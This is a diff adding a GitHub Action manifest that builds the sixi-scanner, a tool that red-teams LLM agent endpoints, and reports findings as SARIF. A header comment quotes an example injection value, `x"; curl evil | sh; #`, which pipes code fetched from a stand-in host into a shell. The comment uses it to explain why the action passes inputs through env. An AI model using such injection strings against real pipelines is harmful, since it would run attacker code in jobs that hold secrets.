@@ -1,0 +1,119 @@
+# Copyright 2026 Radoslaw Brus. SPDX-License-Identifier: Apache-2.0 (LICENSE and NOTICE: github.com/rbrus/scan-action).
+#
+# The GitHub Action: build the open-source sixi-scanner, scan one agent endpoint from the runner,
+# write SARIF for the Security tab, gate on severity. No hosted service, no account, no token.
+#
+# Inputs reach the script through `env:` and never through ${{ }} interpolation into a shell line:
+# a ${{ }} expansion is pasted into the script before bash parses it, and a target URL of
+# `x"; curl evil | sh; #` in a pull request title would run in the job that holds the target's secrets.
+name: Sixi Scanner agent scan
+description: Red-teams an LLM agent endpoint with the open-source sixi-scanner and files the findings as SARIF.
+author: Radoslaw Brus
+branding:
+  icon: shield
+  color: gray-dark
+
+inputs:
+  url:
+    description: The agent endpoint to scan. Only scan endpoints you are authorised to test.
+    required: true
+  target:
+    description: "Transport: openai | json | webform | echo"
+    default: openai
+  model:
+    description: openai only — the model field of the request.
+    default: ""
+  body:
+    description: 'json only — request body template; {{json}} is the JSON-escaped probe, e.g. {"question":{{json}}}'
+    default: ""
+  reply-path:
+    description: json only — dotted path to the reply in the response, e.g. answer.text
+    default: ""
+  field:
+    description: webform only — the form field the probe goes in.
+    default: ""
+  headers:
+    description: 'Extra request headers, one "Name: value" per line. Pass secrets from secrets, never literals.'
+    default: ""
+  fail-on:
+    description: Fail the job for a finding at or above this severity — critical | high | medium | low | none.
+    default: high
+  rounds:
+    description: How many times to walk the whole technique set.
+    default: "1"
+  only:
+    description: Comma-separated technique IDs to run; empty runs all.
+    default: ""
+  exclude:
+    description: Comma-separated technique IDs to skip.
+    default: ""
+  context:
+    description: Path to a JSON file describing the agent; required by confirm-url.
+    default: ""
+  confirm-url:
+    description: Optional OpenAI-compatible endpoint that confirms each candidate break. Empty disables the stage.
+    default: ""
+  confirm-model:
+    description: The model to ask at confirm-url.
+    default: ""
+  confirm-key:
+    description: Bearer token for confirm-url, from a secret.
+    default: ""
+  timeout-minutes:
+    description: Abort the whole scan after this long. An aborted scan exits 3, never 0.
+    default: "60"
+  version:
+    description: The sixi-scanner version to build — a tag such as v0.5.0, or latest.
+    default: v0.5.0
+  sarif-path:
+    description: Where to write the SARIF for github/codeql-action/upload-sarif.
+    default: sixi.sarif
+  report-path:
+    description: Where to write the full JSON report, transcripts included. Keep it out of public artefacts.
+    default: sixi-report.json
+
+outputs:
+  findings:
+    description: How many findings the scan recorded.
+    value: ${{ steps.scan.outputs.findings }}
+  gated:
+    description: How many findings are at or above fail-on.
+    value: ${{ steps.scan.outputs.gated }}
+  sarif-path:
+    description: The SARIF written, for the upload step.
+    value: ${{ steps.scan.outputs.sarif-path }}
+  report-path:
+    description: The JSON report written.
+    value: ${{ steps.scan.outputs.report-path }}
+
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-go@v5
+      with:
+        go-version: stable
+        cache: false
+
+    - id: scan
+      shell: bash
+      env:
+        SIXI_URL: ${{ inputs.url }}
+        SIXI_TARGET: ${{ inputs.target }}
+        SIXI_MODEL: ${{ inputs.model }}
+        SIXI_BODY: ${{ inputs.body }}
+        SIXI_REPLY_PATH: ${{ inputs.reply-path }}
+        SIXI_FIELD: ${{ inputs.field }}
+        SIXI_HEADERS: ${{ inputs.headers }}
+        SIXI_FAIL_ON: ${{ inputs.fail-on }}
+        SIXI_ROUNDS: ${{ inputs.rounds }}
+        SIXI_ONLY: ${{ inputs.only }}
+        SIXI_EXCLUDE: ${{ inputs.exclude }}
+        SIXI_CONTEXT: ${{ inputs.context }}
+        SIXI_CONFIRM_URL: ${{ inputs.confirm-url }}
+        SIXI_CONFIRM_MODEL: ${{ inputs.confirm-model }}
+        SIXI_CONFIRM_API_KEY: ${{ inputs.confirm-key }}
+        SIXI_TIMEOUT_MINUTES: ${{ inputs.timeout-minutes }}
+        SIXI_VERSION: ${{ inputs.version }}
+        SIXI_SARIF_PATH: ${{ inputs.sarif-path }}
+        SIXI_REPORT_PATH: ${{ inputs.report-path }}
+      run: bash "$GITHUB_ACTION_PATH/action/scan.sh"
